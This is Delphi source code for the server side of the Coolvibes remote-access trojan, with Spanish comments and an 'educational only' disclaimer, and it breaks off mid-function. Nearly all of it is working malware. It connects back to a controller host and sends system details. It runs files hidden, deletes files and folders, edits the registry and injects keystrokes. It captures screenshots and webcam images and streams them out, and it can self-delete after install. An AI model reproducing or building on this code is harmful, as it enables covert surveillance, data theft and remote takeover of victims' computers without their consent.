{Unit principal del Server del troyano Coolvibes}

(* Este código fuente se ofrece sólo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo dueño sea una persona diferente de usted, a no ser
   que el dueño haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes será responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

     El equipo Coolvibes
*)
library CoolServer;

uses
  Windows,
  SysUtils,
  //  ScktComp,
  //  MMSystem, Elimina: mcisendstring
  ShellAPI,
  Classes,
  lomtask,
  lomlib,
  SndKey32,
  UnitFunciones,
  UnitSystemInfo,
  UnitProcess,
  UnitWindows,
  UnitBromas,
  UnitFileManager,
  UnitRegistro,
  MiniReg,
  UnitVariables,
  unitCapScreen,  //Se activa de nuevo
  unitCamScreen, //Aca estan todas las funciones de captura  //Desactivado jpeg plugin en V0.5UP2
  unitAvs,
  UnitCambioId,
  SettingsDef,
  //  UnitWebcam,
  UnitInstalacion,
  UnitShell,
  UnitServicios,
  SocketUnit,
  UnitTransfer;

type
  TDescarga = record
    Descargado: int64;  //Datos descargados
    SizeFile:   int64;
  end;
  {
  TClassClientSocket = class
    ClientSocket: TClientSocket;
    ClientSocketFiles: TClientSocket;
    procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientSocketReadFile(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ClientSocketOnConnect(Sender: TObject; Socket: TCustomWinSocket);
  end;
   }
var
  //Cliente: TClassClientSocket;
  Msg:  TMsg;
  SH:   integer;  //SocketHandle de la conexión principal
  Descarga: TDescarga;
  RecibiendoFichero: boolean = False;
  sock: TClientSocket;
  KeepAliveHandle: THandle;
  pingSent, Busy, pongReceived: boolean;
  lastCommandTime: integer;


const
  WM_ACTIVATE = $0006;
  WM_QUIT = $0012;
  ENTER = #10;

  procedure sendText(str: ansistring);
  begin
    sock.SendString(str);
  end;

  procedure CrearServer();
  var
    ConfigLeida: PSettings;
    i: integer;
  begin
    //Aquí va la carga de opciones del editor. Inicializamos las variables configurables del troyano
    //que están todas dentro de un record (Configuracion : TSettings).
    if ReadSettings(ConfigLeida) = True then
    begin
      //El record Configuracion esta definido en la unidad UnitVariables.

    end
    else
    begin
      //halt;  //Si no pude leer la configuracion...detener la ejecución
      //Para desarrollo es mejor que cargue una configuración por defecto
      Configuracion.sHost   := '127.0.0.1';
      Configuracion.sPort   := '7000';
      Configuracion.sID     := 'Coolserver';
      Configuracion.iPort   := 7000;
      Configuracion.iTimeToNotify := 1;
      //En segundos cada cuanto intenta conectarse el server al cliente
      Configuracion.bCopiarArchivo := False; //Me copio o no?
      Configuracion.sFileNameToCopy := 'coolserver.exe';
      //nombre del nuevo archivo a copiar
      Configuracion.sCopyTo := 'C:\'; //la carpeta donde debe copiarse
      Configuracion.bCopiarConFechaAnterior := False; //Modificar la fecha del servidor?
      Configuracion.bMelt   := False; //Melt?
      Configuracion.bArranquePolicies := False; //Me agrego a Policies?
      Configuracion.sPoliciesRegKeyName := 'Coolserver';
      //Nombre con el que me agrego a policies
      //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
      VersionDelServer      := '0.52';
    end;
    //Fin de carga de configuración

    //Ejecuto los posibles parametros que me puedan pasar
    if ParamStr(1) = '\melt' then
    begin
      //borro el archivo de instalación, reintento 5 veces por si las moscas :)
      for i := 1 to 5 do
      begin
        BorrarArchivo(ParamStr(2));
        if not FileExists(ParamStr(2)) then
          break; //si yalo borrò entonces se sale del for
        Sleep(10);
      end;
      //Otra opción: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
    end; //Termina el Melt

    //Se crean los valores del socket
  {
  Cliente := TClassClientSocket.Create;
  Cliente.ClientSocket := TClientSocket.Create(nil);
  Cliente.ClientSocket.Host := Configuracion.sHost;
  Cliente.ClientSocket.Port := Configuracion.iPort;
  Cliente.ClientSocket.OnRead := Cliente.ClientSocketRead;
  Cliente.ClientSocket.OnError := Cliente.ClientSocketError;
  }
  end;

  procedure CheckAlive();
  begin
    if not sock.connected then
    begin
      //No estaba conectado asi que me salgo
      Exit;
    end;

    if (getTickCount - lastCommandTime) < 20000 then
      Exit;
    //No ha pasado 20 seg idle asi que no mando ping: (getTickCount - lastCommandTime)

    if not busy then
    begin
      //No estaba Busy
      if pingSent then
      begin
        //Ya habia enviado el ping
        if not pongReceived then
        begin
          //No recibi el pong asi que me voy a desconectar
          sock.Disconnect;
          //Ya me desconecte
        end
        else
        begin
          pingSent := False;
        end;
      end
      else
      begin
        //No habia mandado el ping asi que lo mando
        pingSent     := True;
        pongReceived := False;
        SendText('PING' + ENTER);
        //Ya mande el ping
      end;
    end;

  end;

  procedure KeepAliveTimer(Interval: DWORD);
  begin
    KeepAliveHandle := SetTimer(0, 0, Interval, @CheckAlive);
  end;

  procedure KeepAliveThread;
  var
    Msg: TMsg;
  begin
//    ShowMessage('Soy el keepalive thread!!');
    KeepAliveTimer(10000);
    while (GetMessage(Msg, 0, 0, 0)) do
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
      if RegKeyExists(HKEY_CURRENT_USER,
        'Software\Microsoft\Active Setup\Installed Components\{D3B930A4-76AC-11DD-82E7-913F56D89593}\') then
        RegDelKey(HKEY_CURRENT_USER,
          'Software\Microsoft\Active Setup\Installed Components\{D3B930A4-76AC-11DD-82E7-913F56D89593}\');
    end;
  end;

  procedure Conectar();
  begin
{  if not Cliente.ClientSocket.Active then
    Cliente.ClientSocket.Open
  else
    Cliente.ClientSocket.Socket.SendText('CONNECTED?' + ENTER); //Si no estoy conectado aqui se disparará}
  end;
  //el efecto onError y Socket.Active se volverá False
{
procedure TClassClientSocket.ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  //terminar el Thread de la Shell para que no se quede activo cmd.exe
  if ShellThreadID <> 0 then
    PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'), DWord(String(PChar('exit'))));
  ErrorCode := 0; //Para que no muestre nada
end;

procedure TClassClientSocket.ClientSocketOnConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  Socket.SendText('SH|' + IntToStr(SH)+ENTER); //Socket Handle
end;

procedure TClassClientSocket.ClientSocketRead(Sender: TObject;
      Socket: TCustomWinSocket);
var
  Recibido, Respuesta, TempStr, TempStr1, TempStr2 ,TempStr3: String;
  Tipo, BotonPulsado, i  : Integer;
  TempCardinal           : Cardinal;
  Tam                    : Int64;
  ShellParameters        : TShellParameters;
  ThreadInfo             : TThreadInfo;
  FilePath, LocalFilePath: AnsiString;
begin
end;
 }

  function leer(s: TClientSocket): ansistring;
  var
    buf:   array [0..0] of char;
  var
    input: ansistring;
  begin
    input  := '';
    buf[0] := ' ';
    s.ReceiveBuffer(buf, sizeof(buf));
    while ((buf[0] <> #10) and (buf[0] <> #13) and (s.Connected)) do
    begin
      input := input + buf[0];
      try
        s.ReceiveBuffer(buf, sizeof(buf));

      except
        input := '';
        s.Destroy;
        break;
      end;
    end;
    Result := input;
  end;

  procedure iniciar();
  var
    Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3: ansistring;
    Tipo, BotonPulsado, i: integer;
    TempCardinal: cardinal;
    Tam: int64;
    ShellParameters: TShellParameters;
    ThreadInfo: TThreadInfo;
    FilePath, LocalFilePath: ansistring;
    //  Socket: TCustomWinSocket;
    //  socket: TCLientSocket;
    CSocket : TClientSocket; //Socket para la captura de pantalla
  begin
    try
      begin
        sock := TCLientSocket.Create;  //Socket principal
        CSocket := TClientSocket.Create; //Socket Captura de Pantalla   

        sock.Connect(Configuracion.sHost, Configuracion.iPort);
        lastCommandTime := getTickCount;
        while sock.Connected do
        begin
          Recibido := Trim(leer(sock));

          Busy := True;

          if Recibido = 'PING' then  //Respuesta a pings
          begin
            SendText('PONG' + ENTER);
            //    Exit;
          end;

          if Recibido = 'PONG' then
          begin
            pongReceived := True;
            //    Exit;
          end;

  {Información mostrada en el ListView de conexiones del cliente, se recibe tambien
  el SocketHandle del cliente, que lo usaremos para relaccionar la conexión principal
  con la conexión para enviar y recibir ficheros}
          if Copy(Recibido, 1, 8) = 'MAININFO' then
          begin
            Delete(Recibido, 1, 9);  // 'MAININFO|123456'
            SH := StrToInt(Recibido);
{    Cliente.ClientSocketFiles := TClientSocket.Create(nil);
    Cliente.ClientSocketFiles.Host := Configuracion.sHost;
    Cliente.ClientSocketFiles.Port := Configuracion.iPort;
    Cliente.ClientSocketFiles.OnRead := Cliente.ClientSocketReadFile;
    Cliente.ClientSocketFiles.OnConnect := Cliente.ClientSocketOnConnect;
    Cliente.ClientSocketFiles.OnError := Cliente.ClientSocketError;
    Cliente.ClientSocketFiles.Open;
 }
            Respuesta := Sock.LocalAddress + '|' +  //IP privada
              LeerID() + '|' + GetCPU() + '|' +
              GetOS() + '|' + VersionDelServer + '|';
            SendText('MAININFO|' + Respuesta + ENTER);
          end;

          //Información mas extendida del sistema
          if Recibido = 'INFO' then
          begin
            Respuesta := GetOS() + '|' + GetCPU() + '|' +
              GetUptime() + '|' + GetIdleTime() +
              '|' + ObtenerAvs() + '|' + ObtenerFirewall +
              '|' + GetPCName() + '|' + GetPCUser() +
              '|' + GetResolucion() + '|' + GetTamanioDiscos() + '|';
            SendText('INFO|' + Respuesta + ENTER);
          end;

          //Comandos relacionados con la gestión del servidor
          if Copy(Recibido, 1, 8) = 'SERVIDOR' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
            Delete(Recibido, 1, Pos('|', Recibido));
            //Información específica del servidor
            if TempStr = 'INFO' then
            begin
              with Configuracion do
                TempStr := VersionDelServer + '|' + sID +
                  '|' + sHost + '|' + sPort + '|' +
                  IntToStr(iTimeToNotify) + ' segundos' + '|' +
                  BooleanToStr(bCopiarArchivo, 'Sí', 'No') + '|' +
                  sFileNameToCopy + '|' + sCopyTo +
                  '|' + BooleanToStr(bMelt, 'Sí', 'No') + '|' +
                  BooleanToStr(bCopiarConFechaAnterior, 'Sí', 'No') +
                  '|' + BooleanToStr(bArranquePolicies, 'Sí', 'No') +
                  '|' + sPoliciesRegKeyName + '|' + ParamStr(0) + '|';
              SendText('SERVIDOR|INFO|' + TempStr + ENTER);
            end;
            //Cerrar server
            if TempStr = 'CERRAR' then
            begin
              //SendText('MSG|Adiós!');
              Halt;
            end;
            //Desinstalar server
            if TempStr = 'DESINSTALAR' then
            begin
              //SendText('MSG|El servidor ha sido desinstalado.');
              Desinstalar();
            end;
          end;

          //Comandos relaccionados con los procesos
          if Recibido = 'PROC' then
          begin
            Respuesta := GetProc();
            SendText('PROC|' + Respuesta + ENTER);
          end;

  {Si los primeros ocho caracteres son 'KILLPROC', significa que hay que matar
  un proceso. Saca el PID y mata ese proceso. Sintaxis del comando: KILLPROC|<PID>}
          if Copy(Recibido, 1, 8) = 'KILLPROC' then
          begin
            Delete(Recibido, 1, 9);
            if TerminarProceso(Recibido) = True then
              SendText('MSG|Proceso matado con PID ' + Recibido + ENTER)
            else
              SendText('MSG| :( No pude matar el proceso con PID ' + Recibido + ENTER);
          end;
          //Fin de comandos relaccionados con los procesos

          //Comandos relaccionados con las ventanas
          if Recibido = 'WIND' then
          begin
            Respuesta := GetWins();
            SendText('WIND|' + Respuesta + ENTER);
          end;

          if Copy(Recibido, 1, 7) = 'WINPROC' then
            //Sintaxis: WINDPROC|Handle //Envìa el PID del proceso padre de la ventana con Handle
          begin
            Delete(Recibido, 1, 8);
            GetWindowThreadProcessID(StrToInt(Recibido), TempCardinal);
            //WINDPROC|HandleDeLaVentana|ProcessID
            SendText('WINPROC|' + Recibido + '|' + IntToStr(TempCardinal) + ENTER);
          end;

          if Copy(Recibido, 1, 8) = 'CLOSEWIN' then
          begin
            Delete(Recibido, 1, 9);
            CerrarVentana(StrToInt(Recibido));
            SendText('MSG|Ventana cerrada con Handle ' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 6) = 'MAXWIN' then
          begin
            Delete(Recibido, 1, 7);
            MaximizarVentana(StrToInt(Recibido));
            SendText('MSG|Ventana maximizada con Handle ' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 6) = 'MINWIN' then
          begin
            Delete(Recibido, 1, 7);
            MinimizarVentana(StrToInt(Recibido));
            SendText('MSG|Ventana minimizada con Handle ' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 7) = 'SHOWWIN' then
          begin
            Delete(Recibido, 1, 8);
            MostrarVentana(StrToInt(Recibido));
            SendText('MSG|Ventana mostrada con Handle ' + Recibido + ENTER);
          end;

          if Copy(Recibido, 1, 7) = 'HIDEWIN' then
          begin
            Delete(Recibido, 1, 8);
            OcultarVentana(StrToInt(Recibido));
            SendText('MSG|Ventana ocultada con Handle ' + Recibido + ENTER);
          end;

          if Recibido = 'MINALLWIN' then
          begin
            MinimizarTodas();
            SendText('MSG|Minimizadas todas las ventanas.' + ENTER);
          end;

          if Copy(Recibido, 1, 11) = 'BOTONCERRAR' then
          begin
            Delete(Recibido, 1, 12);
            if Copy(Recibido, 1, 2) = 'SI' then
            begin
              Delete(Recibido, 1, 3); //Borra 'SI|' y queda el handle
              BotonCerrar(True, StrToInt(Recibido));
              SendText('MSG|Se activó el botón Cerrar [X] en la ventana con Handle ' +
                Recibido + ENTER);
            end
            else
            begin
              Delete(Recibido, 1, 3); //Borra 'NO|' y queda el handle
              BotonCerrar(False, StrToInt(Recibido));
              SendText('MSG|Se desactivó el botón Cerrar [X] en la ventana con Handle ' +
                Recibido + ENTER);
            end;
          end;
          if Copy(Recibido, 1, 8) = 'SENDKEYS' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            //Copia el handle de la ventana...
            Delete(Recibido, 1, Pos('|', Recibido)); //borra el handle + '|'
            try
              i := StrToInt(TempStr)
            except
              begin
                SendText('MSG|No se pudieron enviar las teclas a la ventana con handle ' +
                  TempStr + ENTER);
                Exit;
              end;
            end;
            AppActivateHandle(i);
            SendKeys(PChar(Recibido), True);
            SendText('MSG|Se enviaron las teclas a la ventana con handle ' + TempStr + ENTER);
          end;
          //Fin de comandos relacionados con las ventanas

          //Comandos relaccionados con las bromas
          if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
          begin
            Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //activar mouse tembloroso
              CongelarMouse(False); //Lo descongela si está congelado
              TemblarMouse(True);
              SendText('MOUSETEMBLOROSO|Activado' + ENTER);
            end
            else
            begin
              //desactivar mouse tembloroso
              TemblarMouse(False);
              SendText('MOUSETEMBLOROSO|Desactivado' + ENTER);
            end;
          end;

          if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
          begin
            Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //activar congelar mouse
              TemblarMouse(False); //El mouse para de temblar si se congela
              CongelarMouse(True);
              SendText('CONGELARMOUSE|Activado' + ENTER);
            end
            else
            begin
              //desactivar congelar mouse
              CongelarMouse(False);
              SendText('CONGELARMOUSE|Desactivado' + ENTER);
            end;
          end;

          if Copy(Recibido, 1, 7) = 'ABRIRCD' then
          begin
            Delete(Recibido, 1, 8); //Borra 'ABRIRCD|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //abrir cd
              //      mciSendString( 'Set cdaudio door open wait', nil, 0, hInstance);
              SendText('ABRIRCD|Activado' + ENTER);
            end
            else
            begin
              //cerrar cd
              //      mciSendString( 'Set cdaudio door closed wait' , nil , 0 , hInstance );
              SendText('ABRIRCD|Desactivado' + ENTER);
            end;
          end;

          if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
          begin
            Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la cadena
            if Recibido = 'ACTIVAR' then
            begin
              //Desactivar boton inicio
              EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                , 0, 'Button', nil), False);
              SendText('MATARBOTONINICIO|Activado' + ENTER);
            end
            else
            begin
              //Activar boton inicio
              EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                , 0, 'Button', nil), True);
              SendText('MATARBOTONINICIO|Desactivado' + ENTER);
            end;
          end;
          //Fin de comandos relaccionados con las bromas

          //Comandos relaccionados con los mensajes
          if Copy(Recibido, 1, 4) = 'MSJN' then
          begin
            Delete(Recibido, 1, 4);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el mensaje
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Obtenemos el titulo
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Tipo de mensaje
            Delete(Recibido, 1, pos('|', Recibido));
            TempStr3 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            //Obtenemos los botones del mensaje

            Tipo := 0;
            //Miramos el tipo de mensaje
            if TempStr2 = 'WARN' then
              Tipo := MB_ICONERROR;
            if TempStr2 = 'QUES' then
              Tipo := MB_ICONQUESTION;
            if TempStr2 = 'EXCL' then
              Tipo := MB_ICONEXCLAMATION;
            if TempStr2 = 'INFO' then
              Tipo := MB_ICONINFORMATION;

            case StrToInt(TempStr3) of //Lo transformamos en entero para poder usar el case
              0: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
              1: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_OKCANCEL);
              2: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_RETRYCANCEl);
              3: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_YESNO);
              4: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_YESNOCANCEL);
              5: BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1),
                  Tipo + MB_ABORTRETRYIGNORE);
              else
                BotonPulsado := MessageBox(0, PChar(TempStr), PChar(TempStr1), Tipo + MB_OK);
                //nunca debería pasar pero es mejor prevenir
            end;
            case BotonPulsado of
              idOk: SendText('MSG|El usuario respondió: OK' + ENTER);
              idCancel: SendText('MSG|El usuario respondió: Cancelar' + ENTER);
              idRetry: SendText('MSG|El usuario respondió: Reintentar' + ENTER);
              idYes: SendText('MSG|El usuario respondió: Sí' + ENTER);
              idNo: SendText('MSG|El usuario respondió: No' + ENTER);
              idAbort: SendText('MSG|El usuario respondió: Anular' + ENTER);
              idIgnore: SendText('MSG|El usuario respondió: Omitir' + ENTER);
            end;
          end;
          //Fin de comandos relacionados con los Mensajes

          //Comandos relacionados con el FileManager
          if Recibido = 'VERUNIDADES' then
            SendText('VERUNIDADES|' + GetDrives(Tam) + ENTER);

          if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
          begin
            Delete(Recibido, 1, 15);
            if Copy(GetDirectory(Recibido), 1, 4) = 'MSG|' then
            begin
              //Diga que no existe el directorio asignado y salte...
              SendText(GetDirectory(Recibido) + ENTER);
              Exit;
            end;
            TempStr := GetDirectory(Recibido);
            SendText('LISTARARCHIVOS|' + IntToStr(Length(TempStr)) + '|' + TempStr + ENTER);
          end;
          //Ejecutar Archivo...
          if Copy(Recibido, 1, 4) = 'EXEC' then
          begin
            Delete(Recibido, 1, 5); //Borra 'EXEC|'
            if Copy(Recibido, 1, 6) = 'NORMAL' then
            begin
              Delete(Recibido, 1, 7); //Borra 'NORMAL|'
              //Ejecutar en modo normal el archivo que queda en Recibido
              //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
              if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros},
                PChar(ExtractFilePath(Recibido)), SW_NORMAL) > 32 then
                SendText('MSG|Archivo correctamente ejecutado :).' + ENTER)
              else
                SendText('MSG|Se produjo algún error al ejecutar el archivo.' + ENTER);
            end; //if copy = normal
            if Copy(Recibido, 1, 6) = 'OCULTO' then
            begin
              Delete(Recibido, 1, 7);//Borra 'OCULTO|'
              //Ejecutar en modo oculto el archivo que queda en Recibido
              //If the function ShellExecute fails, the return value is an error value that is less than or equal to 32
              if ShellExecute(0, 'open', PChar(Recibido), ''{sin parametros},
                PChar(ExtractFilePath(Recibido)), SW_HIDE) > 32 then
                SendText('MSG|Archivo correctamente ejecutado de manera oculta :).' + ENTER)
              else
                SendText('MSG|Se produjo algún error al ejecutar el archivo de manera oculta.'
                  + ENTER);
            end; //if copy = oculto
          end; //if copy = exec

          //Borrar archivo
          if Copy(Recibido, 1, 7) = 'DELFILE' then
          begin
            Delete(Recibido, 1, 8);//Borra 'DELFILE|'
            if FileExists(Recibido) then
            begin
              if BorrarArchivo(Recibido) = True then
                SendText('MSG|El archivo fue borrado con éxito.' + ENTER)
              else
                SendText('MSG|El archivo no se pudo borrar.' + ENTER);
            end
            else //el archivo no existe.... Se supone que nunca o muy pocas veces debería pasar.
              SendText('MSG|El archivo no existe. Tal vez ya fue borrado.' + ENTER);
          end;

          //Borrar carpeta
          if Copy(Recibido, 1, 9) = 'DELFOLDER' then
          begin
            Delete(Recibido, 1, 10);
            if DirectoryExists(Recibido) then
            begin
              if BorrarCarpeta(Recibido) = True then
                SendText('MSG|La carpeta fue borrada con éxito.' + ENTER)
              else
                SendText('MSG|No se pudo borrar la carpeta.' + ENTER);
            end
            else
              SendText('MSG|La carpeta no existe. Tal vez ya fue borrada.' + ENTER);
          end;

          //Renombrar archivos o carpetas
          if Copy(Recibido, 1, 6) = 'RENAME' then
          begin
            Delete(Recibido, 1, 7);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el nombre viejo
            Delete(Recibido, 1, Pos('|', Recibido)); //borra lo que acaba de copiar
            if FileExists(TempStr) or DirectoryExists(TempStr) then
            begin
              if RenameFile(TempStr, Recibido) = True then
                SendText('MSG|Archivo o carpeta renombrada con éxito.' + ENTER)
              else
                SendText('MSG|No se pudo renombrar el archivo o la carpeta.' + ENTER);
            end
            else
              SendText('MSG|El archivo o la carpeta no existe.' + ENTER);//el archivo no existe...
          end;

          //Crear carpeta
          if Copy(Recibido, 1, 5) = 'MKDIR' then
          begin
            Delete(Recibido, 1, 6);
            if not DirectoryExists(Recibido) then
            begin
              if CreateDir(Recibido) = True then
                SendText('MSG|Carpeta creada con éxito.' + ENTER)
              else
                SendText('MSG|No se pudo crear la carpeta.' + ENTER);
            end
            else
              SendText('MSG|La carpeta ya existe, no es necesario crearla.' + ENTER);
            //Ya existe una carpeta con ese nombre
          end;
          //Fin de comandos relacionados con el FileManager

          //Comandos relacionados con el Registro
          if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
          begin
            Delete(Recibido, 1, 13);
            TempStr := ListarClaves(Recibido);
            SendText('LISTARCLAVES|' + IntToStr(length(TempStr)) + '|' + TempStr + ENTER);
          end;

          if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
          begin
            Delete(Recibido, 1, 14);
            SendText('LISTARVALORES|' + ListarValores(Recibido) + ENTER);
          end;

          if Copy(Recibido, 1, 14) = 'NEWNOMBREVALOR' then
          begin
            Delete(Recibido, 1, 15);
            //Extraemos la clave donde está el valor
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            //Obtenemos el viejo nombre del valor
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            //Conseguimos el nuevo nombre del valor
            TempStr2 := Copy(Recibido, 1, Length(Recibido));
            if RenombrarClave(PChar(TempStr), PChar(TempStr1), PChar(TempStr2)) then
              SendText('MSG|Modificado nombre de clave con éxito.' + ENTER)
            else
              SendText('MSG|Error al modificar el nombre de la clave.' + ENTER);
          end;

          if Copy(Recibido, 1, 14) = 'BORRARREGISTRO' then
          begin
            Delete(Recibido, 1, 15);
            if BorraClave(Recibido) then
              SendText('MSG|Clave o Valor eliminado con éxito.' + ENTER)
            else
              SendText('MSG|No se pudo eliminar la clave o el valor.' + ENTER);
          end;

          if Copy(Recibido, 1, 8) = 'NEWCLAVE' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Length(Recibido));  //Quitamos la última barra '\'
            if AniadirClave(TempStr + TempStr1, '', 'clave') then
              SendText('MSG|Clave añadida con éxito.' + ENTER)
            else
              SendText('MSG|No se pudo añadir la clave.' + ENTER);
          end;

          if Copy(Recibido, 1, 8) = 'ADDVALUE' then
          begin
            Delete(Recibido, 1, 9);
            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);
            Delete(Recibido, 1, Pos('|', Recibido));
            if AniadirClave(TempStr, Copy(Recibido, 1, Length(Recibido)), TempStr1) then
              SendText('MSG|Valor añadido con éxito.' + ENTER)
            else
              SendText('MSG|No se pudo añadir el valor.' + ENTER);
          end;
          //Fin de comandos relacionados con el Registro

          //Codigo para capturar la pantalla
          if Copy(Recibido, 1, 9) = 'CAPSCREEN' then
          begin
            Delete(Recibido, 1, 9);
            //    CapturarPantalla(StrToInt(Trim(Recibido))); //Capturamos pantalla con compresion recibida
            { if saveScreenJpeg(windir + 'jpgcool.dat', StrToInt(Trim(Recibido))) then
            begin} //Se cambia la forma deg capturar la pantalla (ya no se escribe al disco)
              //    ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort, IntToStr(SH), ExtractFilePath(ParamStr(0)) + 'jpgcool.dat', 'CAPSCREEN', 0);
              {ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
                IntToStr(SH), windir + 'jpgcool.dat', 'CAPSCREEN', 0);
              BeginThread(nil,
                0,
                Addr(ThreadedTransfer),
                ThreadInfo,
                0,
                ThreadInfo.ThreadId);  }
                {Con el antiguo codigo creaba un nuevo socket cada vez que
                 queriamos realizar una captura, ahora utiliza siempre el mismo socket}

                
                 if not (CSocket.Connected) then   //si no estamos conectados conectamos...
                 begin
                  CSocket.Connect(Configuracion.sHost, Configuracion.iPort);    //conectamos
                 end;
                  CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos

                // while CSocket.Connected do  //
                if CSocket.Connected then
                 begin
                  Recibido := Trim(Recibido);      //calidad|ancho|alto
                  TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);//calidad
                  Delete(Recibido, 1, Pos('|', Recibido));
                  TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //ancho
                  Delete(Recibido, 1, Pos('|', Recibido));            //recibido = alto
                  MS := TMemoryStream.create;   //MS de la captura de Pantalla
                  MS.Position := 0;
                  if(Copy(TempStr2, 1, 1) = '%') then//tamaño relativo
                  begin
                   Delete(TempStr2, 1, Pos('%', TempStr2));
                   pantallazo(StrToInt(TempStr1),anchurapantalla()*strtoint(Tempstr2) div 100,alturapantalla()*strtoint(Tempstr2) div 100,GetDesktopWindow());

                  end
                  else
                  pantallazo(StrToInt(TempStr1),strtoint(TempStr2),strtoint(Recibido),GetDesktopWindow());

                  MS.Position := 0;
                  Csocket.SendString('CAPSCREEN|C|' + IntToStr(MS.size) + ENTER);  //mandamos el tamaño
                  TempStr := '';
                  SetLength(TempStr, ms.size);
                  Ms.Read(TempStr[1], ms.size);
                  MS.Free;
                  MS := nil;     
                  CSocket.SendString(Tempstr);    //GOGOGO

                 end;

         {   end
            else
            begin
              SendText('MSG|No se pudo capturar la pantalla.' + ENTER);
            end;  }
          end;
          //Fin del código para capturar pantalla

          if Copy(recibido, 1, 8) = 'CAMBIOID' then
          begin
            Delete(recibido, 1, 8);
            CambiarID(recibido);
          end;

          //Comandos relaccionados con la webcam
          if Copy(recibido, 1, 13) = 'LISTARWEBCAMS' then
                SendText('LISTARWEBCAMS|' + ListarDispositivos + ENTER);

            if Copy(recibido, 1, 13) = 'CAPTURAWEBCAM' then
            begin
              Delete(recibido, 1, 13);
              TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);  //Numero de webcam
              Delete(Recibido, 1, Pos('|', Recibido));

                 if not (CSocket.Connected) then   //si no estamos conectados conectamos...
                 begin
                  CSocket.Connect(Configuracion.sHost, Configuracion.iPort);    //conectamos
                 end;
                  CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos

                // while CSocket.Connected do  //
                if CSocket.Connected then
                 begin

                  MS := TMemoryStream.create;   //MS de la captura de Pantalla
                  MS.Position := 0;
                  CapturarWebcam(MS,StrToInt(TempStr),strtoint(Recibido));
                  MS.Position := 0;
                  Csocket.SendString('CAPTURAWEBCAM|C|' + IntToStr(MS.size) + ENTER);  //mandamos el tamaño
                  TempStr := '';
                  SetLength(TempStr, ms.size);
                  Ms.Read(TempStr[1], ms.size);
                  MS.Free;
                  MS := nil;     
                  CSocket.SendString(Tempstr);    //GOGOGO

                 end;

              //SendText ('<WEBCONWAY>' + IntToStr(TheFileSize) + '|'+ENTER);
            end;

          if copy(Recibido, 1, 6) = 'MOUSEP' then
          begin
            Delete(recibido, 1, 6);
